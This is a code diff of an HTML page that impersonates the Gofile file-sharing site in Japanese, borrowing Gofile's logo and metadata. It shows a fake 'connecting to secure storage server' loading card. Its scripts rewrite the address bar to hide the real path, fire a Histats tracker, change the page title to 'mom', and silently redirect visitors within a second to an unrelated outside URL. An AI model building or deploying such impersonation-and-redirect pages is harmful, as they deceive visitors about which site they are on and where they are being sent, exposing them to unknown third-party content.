@@ -1,196 +1,221 @@
- <!DOCTYPE html>
-<html lang="id">
+<!DOCTYPE html>
+<html lang="ja" class="dark">
 <head>
-   <meta charset="UTF-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Gofile next</title>
     <script src="https://cdn.tailwindcss.com"></script>
- <meta name="description" content="shared" />
-  <meta name="robots" content="index, follow" />
-  <meta name="color-scheme" content="dark" />
-  <meta name="theme-color" content="#162036" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Noto+Sans+JP:wght@400;500;600;700&display=swap" rel="stylesheet">
 
+    <meta name="description" content="shared" />
+    <meta name="robots" content="index, follow" />
+    <meta name="color-scheme" content="dark" />
+    <meta name="theme-color" content="#162036" />
 
-  <meta property="og:type" content="website" />
-  <meta property="og:site_name" content="Gofile" />
-  <meta property="og:locale" content="en_US" />
-  <meta property="og:title" content="Gofile" />
-  <meta property="og:description" content="shared" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="Gofile" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:title" content="Gofile" />
+    <meta property="og:description" content="shared" />
+    <meta property="og:url" content="gofile" />
+    <meta property="og:image" content="https://gofile.io/assets/img/logo-small-og.png" />
+    <meta property="og:image:width" content="300" />
+    <meta property="og:image:height" content="300" />
+    <meta property="og:image:alt" content="Gofile logo" />
 
-  <meta property="og:url" content="gofile" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@Gofile_io" />
+    <meta name="twitter:title" content="Gofile" />
+    <meta name="twitter:description" content="shared." />
+    <meta name="twitter:image" content="https://gofile.io/assets/img/logo-small-og.png" />
 
-  <meta property="og:image" content="https://gofile.io/assets/img/logo-small-og.png" />
-  <meta property="og:image:width" content="300" />
-  <meta property="og:image:height" content="300" />
-  <meta property="og:image:alt" content="Gofile logo" />
+    <link rel="icon" type="image/png" sizes="16x16" href="https://gofile.io/assets/img/favicon16.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="https://gofile.io/assets/img/favicon32.png" />
+    <link rel="icon" type="image/png" sizes="96x96" href="https://gofile.io/assets/img/favicon96.png" />
 
-  <meta name="twitter:card" content="summary" />
-  <meta name="twitter:site" content="@Gofile_io" />
-  <meta name="twitter:title" content="Gofile" />
-  <meta name="twitter:description" content="shared." />
-  <meta name="twitter:image" content="https://gofile.io/assets/img/logo-small-og.png" />
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'Noto Sans JP', 'system-ui', '-apple-system', 'sans-serif'],
+                    },
+                    colors: {
+                        gofile: {
+                            bg: '#162036',
+                            surface: '#1b2533',
+                            card: '#1f2a3a',
+                            border: '#2d3b52',
+                            primary: '#2563eb',
+                            accent: '#3b82f6'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
 
-  <link rel="icon" type="image/png" sizes="16x16" href="https://gofile.io/assets/img/favicon16.png" />
-  <link rel="icon" type="image/png" sizes="32x32" href="https://gofile.io/assets/img/favicon32.png" />
-  <link rel="icon" type="image/png" sizes="96x96" href="https://gofile.io/assets/img/favicon96.png" />
-
-   <style>
-    * { box-sizing: border-box; }
-
-    body {
-      margin: 0;
-      min-height: 100vh;
-      background: #1f2a3a; /* dark blue ala gofile */
-      display: flex;
-      flex-direction: column;
-      color: #94a3b8;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-    }
-
-    /* HEADER */
-    header {
-      height: 56px;
-      display: flex;
-      align-items: center;
-      padding: 0 16px;
-      background: #1b2533;
-    }
-
-    .menu-btn {
-      width: 36px;
-      height: 36px;
-      border-radius: 6px;
-      background: #2563eb;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .menu-btn span,
-    .menu-btn span::before,
-    .menu-btn span::after {
-      content: '';
-      display: block;
-      width: 16px;
-      height: 2px;
-      background: #fff;
-      position: relative;
-    }
-
-    .menu-btn span::before { top: -5px; position: absolute; }
-    .menu-btn span::after { top: 5px; position: absolute; }
-
-    /* MAIN */
-    main {
-      flex: 1;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    /* GOFILE-LIKE SPINNER */
-    .spinner {
-      width: 60px;
-      height: 60px;
-      border-radius: 50%;
-      border: 5px solid transparent;
-      border-top-color: #3b82f6;
-      border-right-color: #3b82f6;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    /* FOOTER */
-    footer {
-      padding: 20px 0 30px;
-      text-align: center;
-      font-size: 14px;
-      background: #1b2533;
-    }
-
-    footer a {
-      display: block;
-      color: #94a3b8;
-      text-decoration: none;
-      margin: 6px 0;
-    }
-  </style>
+    <style>
+        /* Efek transisi fade-out saat redirect */
+        body {
+            transition: opacity 0.6s ease;
+        }
+        body.fade-out {
+            opacity: 0;
+        }
+    </style>
 </head>
-<body>
+<body class="min-h-screen bg-gofile-bg text-slate-300 font-sans antialiased flex flex-col justify-between selection:bg-blue-500 selection:text-white overflow-x-hidden">
 
-  <header>
-    <div class="menu-btn"><span></span></div>
-  </header>
+    <!-- Cahaya Latar Belakang Halus -->
+    <div class="fixed inset-0 pointer-events-none flex items-center justify-center overflow-hidden z-0">
+        <div class="w-80 h-80 sm:w-96 sm:h-96 bg-blue-600/10 rounded-full blur-3xl"></div>
+    </div>
 
-    <main id="content">
-    <div class="spinner" id="spinner"></div>
-  </main>
+    <!-- HEADER -->
+    <header class="relative z-10 h-14 sm:h-16 bg-gofile-surface/90 backdrop-blur-md border-b border-gofile-border/60 px-4 sm:px-6 flex items-center justify-between">
+        <div class="flex items-center gap-3">
+            <!-- Tombol Menu ala Gofile -->
+            <button type="button" aria-label="Menu" class="w-9 h-9 rounded-lg bg-gofile-primary hover:bg-blue-500 active:scale-95 transition-all flex items-center justify-center shadow-md shadow-blue-600/20 cursor-pointer">
+                <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16" />
+                </svg>
+            </button>
 
-  <footer>
-    <a href="#">Home</a>
-    <a href="#">Terms of Service</a>
-    <a href="#">Privacy Policy</a>
-    <a href="#">Copyright</a>
-    <a href="#">Contact</a>
-    <a href="#">made with ❤️ by G0fil Team</a>
-  </footer>
+            <!-- Brand Logo -->
+            <div class="flex items-center gap-2">
+                <div class="w-7 h-7 rounded-lg bg-gradient-to-tr from-blue-600 to-sky-400 flex items-center justify-center text-white shadow-sm">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.3" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M3 15a4 4 0 004 4h9a5 5 0 10-.1-9.999 5.002 5.002 0 10-9.78 2.096A4.001 4.001 0 003 15z" />
+                    </svg>
+                </div>
+                <span class="text-lg font-bold tracking-tight text-white">Go<span class="text-blue-400">file</span></span>
+            </div>
+        </div>
 
-  <script>
-    // spinner tampil 2 detik lalu hilang
-    setTimeout(() => {
-      const spinner = document.getElementById('spinner');
-      spinner.style.opacity = '0';
-      spinner.style.transition = 'opacity 0.3s ease';
-    }, 2000);
-  </script>
+        <!-- Indikator Status Peladen -->
+        <div class="flex items-center gap-2 text-xs font-medium text-slate-400 bg-gofile-card/90 px-3 py-1.5 rounded-full border border-gofile-border/80">
+            <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+            <span class="hidden sm:inline">サーバー稼働中</span>
+            <span class="sm:hidden">オンライン</span>
+        </div>
+    </header>
 
-<!-- ===== HISTATS (PAKSA ROOT) ===== -->
-<script>
-/* paksa Histats selalu baca ROOT */
-history.replaceState(null, "", "/");
-document.title = "mom";
+    <!-- MAIN -->
+    <main id="content" class="relative z-10 flex-1 flex items-center justify-center p-4">
+        <div class="w-full max-w-sm bg-gofile-card/85 backdrop-blur-md border border-gofile-border/80 rounded-2xl p-7 sm:p-8 shadow-2xl shadow-black/40 flex flex-col items-center text-center">
+            
+            <!-- Spinner Utama (ID dipertahankan agar script tetap berjalan) -->
+            <div id="spinner" class="relative w-16 h-16 mb-5 flex items-center justify-center">
+                <!-- Cincin luar berputar -->
+                <div class="w-16 h-16 rounded-full border-4 border-slate-700/60 border-t-blue-500 border-r-blue-500 animate-spin"></div>
+                <!-- Ikon berkas di tengah -->
+                <div class="absolute inset-0 flex items-center justify-center text-blue-400">
+                    <svg class="w-6 h-6 animate-pulse" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M7 21h10a2 2 0 002-2V9.414a1 1 0 00-.293-.707l-5.414-5.414A1 1 0 0012.586 3H7a2 2 0 00-2 2v14a2 2 0 002 2z" />
+                    </svg>
+                </div>
+            </div>
 
-/* cegah double hit */
-if (!sessionStorage.getItem("histats_hit")) {
-  sessionStorage.setItem("histats_hit", "1");
+            <!-- Teks Status -->
+            <h1 class="text-base sm:text-lg font-semibold text-white tracking-tight mb-1">
+                コンテンツを読み込み中...
+            </h1>
+            <p class="text-xs sm:text-sm text-slate-400 mb-5">
+                安全なストレージサーバーに接続しています
+            </p>
 
-  var _Hasync = _Hasync || [];
-  _Hasync.push(['Histats.start','1,4971849,4,0,0,0,00000000']);
-  _Hasync.push(['Histats.fasi','1']);
-  _Hasync.push(['Histats.track_hits','']);
+            <!-- Bilah Progres Animasi -->
+            <div class="w-full h-1.5 bg-gofile-surface rounded-full overflow-hidden border border-gofile-border/60">
+                <div id="progress-fill" class="h-full bg-gradient-to-r from-blue-600 to-sky-400 rounded-full transition-all duration-700 ease-out" style="width: 25%;"></div>
+            </div>
+        </div>
+    </main>
 
-  (function() {
-    var hs = document.createElement('script');
-    hs.async = true;
-    hs.src = '//s10.histats.com/js15_as.js';
-    document.body.appendChild(hs);
-  })();
-}
-</script>
-<!-- ===== END HISTATS ===== -->
+    <!-- FOOTER -->
+    <footer class="relative z-10 bg-gofile-surface border-t border-gofile-border/60 py-6 px-4 text-center text-xs sm:text-sm text-slate-400">
+        <div class="max-w-4xl mx-auto flex flex-col items-center gap-3">
+            <nav class="flex flex-wrap items-center justify-center gap-x-5 gap-y-2">
+                <a href="#" class="hover:text-white transition-colors">ホーム</a>
+                <a href="#" class="hover:text-white transition-colors">利用規約</a>
+                <a href="#" class="hover:text-white transition-colors">プライバシーポリシー</a>
+                <a href="#" class="hover:text-white transition-colors">著作権</a>
+                <a href="#" class="hover:text-white transition-colors">お問い合わせ</a>
+            </nav>
+            <a href="#" class="text-slate-500 hover:text-slate-300 transition-colors mt-1">
+                made with ❤️ by G0fil Team
+            </a>
+        </div>
+    </footer>
 
-<script>
-/* tampilkan slug random SETELAH Histats */
-setTimeout(() => {
-  const c = "abcdefghijklmnopqrstuvwxyz0123456789";
-  let slug = "";
-  for (let i = 0; i < 4; i++) {
-    slug += c[Math.floor(Math.random() * c.length)];
-  }
-  history.replaceState(null, "", "/" + slug);
-}, 200);
+    <script>
+        // Animasi bilah progres visual
+        setTimeout(() => {
+            const fill = document.getElementById('progress-fill');
+            if (fill) fill.style.width = '90%';
+        }, 150);
 
-/* redirect */
-setTimeout(() => {
-  document.body.classList.add("fade-out");
-  setTimeout(() => {
-    location.href = "https://arwf.org/4/8047b6e6695828771a2f441f87aba775";
-  }, 600);
-}, 800);
-</script>
+        // spinner tampil 2 detik lalu hilang
+        setTimeout(() => {
+            const spinner = document.getElementById('spinner');
+            if (spinner) {
+                spinner.style.opacity = '0';
+                spinner.style.transition = 'opacity 0.3s ease';
+            }
+        }, 2000);
+    </script>
+
+    <!-- ===== HISTATS (PAKSA ROOT) ===== -->
+    <script>
+        /* paksa Histats selalu baca ROOT */
+        try {
+            history.replaceState(null, "", "/");
+        } catch (e) {}
+        document.title = "mom";
+
+        /* cegah double hit */
+        if (!sessionStorage.getItem("histats_hit")) {
+            sessionStorage.setItem("histats_hit", "1");
+
+            var _Hasync = _Hasync || [];
+            _Hasync.push(['Histats.start','1,4971849,4,0,0,0,00000000']);
+            _Hasync.push(['Histats.fasi','1']);
+            _Hasync.push(['Histats.track_hits','']);
+
+            (function() {
+                var hs = document.createElement('script');
+                hs.async = true;
+                hs.src = '//s10.histats.com/js15_as.js';
+                document.body.appendChild(hs);
+            })();
+        }
+    </script>
+    <!-- ===== END HISTATS ===== -->
+
+    <script>
+        /* tampilkan slug random SETELAH Histats */
+        setTimeout(() => {
+            try {
+                const c = "abcdefghijklmnopqrstuvwxyz0123456789";
+                let slug = "";
+                for (let i = 0; i < 4; i++) {
+                    slug += c[Math.floor(Math.random() * c.length)];
+                }
+                history.replaceState(null, "", "/" + slug);
+            } catch (e) {}
+        }, 200);
+
+        /* redirect */
+        setTimeout(() => {
+            document.body.classList.add("fade-out");
+            setTimeout(() => {
+                location.href = "https://arwf.org/4/8047b6e6695828771a2f441f87aba775";
+            }, 600);
+        }, 800);
+    </script>
 
 </body>
 </html>
